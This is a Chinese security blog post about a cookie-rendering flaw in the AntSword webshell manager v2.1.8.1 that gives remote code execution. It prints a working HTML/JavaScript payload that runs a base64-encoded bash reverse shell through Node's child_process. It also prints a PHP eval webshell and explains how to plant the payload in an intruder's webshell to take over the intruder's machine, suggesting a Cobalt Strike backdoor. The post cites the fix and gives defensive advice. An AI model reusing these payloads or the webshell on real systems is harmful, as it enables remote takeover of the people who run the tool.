---
title: "HW弹药库之你的蚁剑shell还是你的shell吗？"
source: https://mrxn.net/jswz/161.html
---

# HW弹药库之你的蚁剑shell还是你的shell吗？

[Mrxn](https://mrxn.net/author/1)* 发表于2020/9/7 00:48
* 3932浏览
* [1评论](#comment)
* 35分钟
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

HW弹药库之你的蚁剑
[shell](https://mrxn.net/tag/shell)
还是你的 shell 吗？可能从你的小宝贝变成了小叛徒哦！

——蚁剑 v2.1.8.1 查看站点 cookie html解析未过滤漏洞可反向
[RCE](https://mrxn.net/tag/rce)

[![HW弹药库之你的蚁剑shell还是你的shell吗？](https://mrxn.net/content/uploadfile/202009/thum-a1a51599624575.png "点击查看原图")](https://mrxn.net/content/uploadfile/202009/a1a51599624575.png)

**0X0:背景**

说来我等菜鸡是不会也没想过去审计这些工具源码，哪怕是开源的，都是拿来主义，大部分看官也是吧。

但是我这个人对于情报搜集特别感兴趣！时常监控一些开源项目或者官网的commit或者更新公告，这不前段时间就看到了芋头师傅（leohearts）提交了一个issue 包含了我的监控关键字
[RCE](https://mrxn.net/tag/rce)
，

[![HW弹药库之你的蚁剑shell还是你的shell吗？](https://mrxn.net/content/uploadfile/202009/thum-37d61599624573.png "点击查看原图")](https://mrxn.net/content/uploadfile/202009/37d61599624573.png)

我当时就看了，当时复现了下，但是没有记录，等着 Medicean 师傅修好了我再发，前天，终于修了！距离提交的时间是十一天过后，可能师傅工作比较忙吧！

**0X1:复现环节**

打开我们的主角-antSword ，在关于程序里面可以看到版本为 v2.1.8.1，下面开始测试，首先在本地PHP环境目录写一个html文件，内容为：

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h3>蚁剑 查看站点 cookie 未过滤致 RCE 测试</h3>
    <script>document.cookie="a=<img src=x onerror='require(\"child_process\").exec(\"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2IDA+JjEK | base64 -d | bash\")'/>"</script>
</body>
</html>
```

然后在

antSword 里面添加我们的本地测试URL，密码 连接类型这些随便写，地址写对了就行

[![HW弹药库之你的蚁剑shell还是你的shell吗？](https://mrxn.net/content/uploadfile/202009/thum-f4541599624573.png "点击查看原图")](https://mrxn.net/content/uploadfile/202009/f4541599624573.png)

添加好了之后，在本地使用 NC 监听 nc -lv 666 因为上面的 base64 编码后的就是反弹 shell 到我们的666端口，不多说，不懂得 Google

然后我们再用

antSword 右键的 查看站点（英文的为 View Site）

即可触发获得一个 shell

[![HW弹药库之你的蚁剑shell还是你的shell吗？](https://mrxn.net/content/uploadfile/202009/thum-d8481599624573.png "点击查看原图")](https://mrxn.net/content/uploadfile/202009/d8481599624573.png)

看一下


Medicean 师傅的 commit 极了可以看到修复的方式是在 cookie 取值的部分添加了 noxss 方法来

进行了 XSS 过滤

。

[![HW弹药库之你的蚁剑shell还是你的shell吗？](https://mrxn.net/content/uploadfile/202009/thum-7c151599624575.png "点击查看原图")](https://mrxn.net/content/uploadfile/202009/7c151599624575.png)

**0X2:漏洞利用**

复现完毕后我就在思考，能不能借此做点小动作？答案是可以的！

想一下，本身是 html格式的URL地址，除了故意这么去复现的查看站点，很少有人拿到shell后去这么干！除非 shell 需要设置 cookie，从 cookie 里取值，这个时候就很容易想到蚁剑的 AES shell 需要设置 cookie ，那就有利用的可能了！

有两种情况，第一种是本身就是 PHP 的 shell ，如果 黑客的 webshell 是使用的 蚁剑的 AES webshell ，基本代码如下：

```
<?php
@session_start();
$pwd='ant';
$key=@substr(str_pad(session_id(),16,'a'),0,16);
@eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING));
?>
```

假如黑客
[webshell](https://mrxn.net/tag/shell)
如上 名为 shell.php ，我们可以把他的 shell 改为如下内容：

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h3>蚁剑 查看站点 cookie 未过滤致 RCE 测试</h3>
    <?php
    @session_start();
    $pwd='ant';
    $key=@substr(str_pad(session_id(),16,'a'),0,16);
    @eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING));
    ?>
    <script>document.cookie="a=<img src=x onerror='require(\"child_process\").exec(\"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2IDA+JjEK | base64 -d | bash\")'/>"</script>
</body>
</html>
```

直接把他的 shell 改为 html 和 PHP 代码混写！

[![HW弹药库之你的蚁剑shell还是你的shell吗？](https://mrxn.net/content/uploadfile/202009/thum-330f1599624574.png "点击查看原图")](https://mrxn.net/content/uploadfile/202009/330f1599624574.png)

因为 PHP 本身就可以这么写，而且可以同时执行 PHP 代码和 html 代码。

当然，真实情况下我们要做的隐蔽点 把 没必要的 标题和 H3 这些丢弃。改写后的 shell 如何让黑客再次使用 查看站点 功能来获取 cookie 这是个问题，需要让他原本保存的 cookie 失效，比如重启 PHP 清除缓存 等方法尝试，假设你达成了如上条件，成功清除了 黑客 shell cookie ，那么接下来就是他 连接 shell 发现连接不上，打开
[shell](https://mrxn.net/tag/shell)
地址发现还在，可能会使用 查看站点的功能来 获取cookie ，就可以顺利的 获得一个反向shell。

[![HW弹药库之你的蚁剑shell还是你的shell吗？](https://mrxn.net/content/uploadfile/202009/thum-73631599624575.png "点击查看原图")](https://mrxn.net/content/uploadfile/202009/73631599624575.png)

测试是在 Mac 环境下测试，可以根据情况修改需要执行的操作，比如直接执行 CS 后门或者 PS下载执行 等等。

**0X3:总结**

这个
[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
很鸡肋！

其一：需要使用 查看站点功能；

其二：需要让之前的shell cookie 失效；

其三：配合特定的环境，比如解析漏洞或者.htaccess

但是也是一种思路，说不定你就可以借此反日 大黑阔！哈哈哈。各位朋友，使用工具须谨慎！说不定还要未公开的 XXday 等着你上钩呢！最起码 把工作和生活用电脑环境区分开，使用个虚拟机，虚拟机一定要开启自动升级，保持最新版，虚拟机里最好再套两层代理，保护自己，保护大家！

参考连接：

https://github.com/AntSwordProject/antSword/issues/256

https://github.com/AntSwordProject/antSword/commit/0d5b8b7c4f5f9520b0cacb7306beb190efa19881

* 标签：
* [#
  攻击](https://mrxn.net/tag/%E6%94%BB%E5%87%BB)
* [#
  渗透测试](https://mrxn.net/tag/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95)
* [#
  getshell](https://mrxn.net/tag/getshell)
* [#
  rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[HW弹药库之你的蚁剑shell还是你的shell吗？](https://mrxn.net/jswz/161.html)
  
文章链接：
<https://mrxn.net/jswz/161.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/161.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/161.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});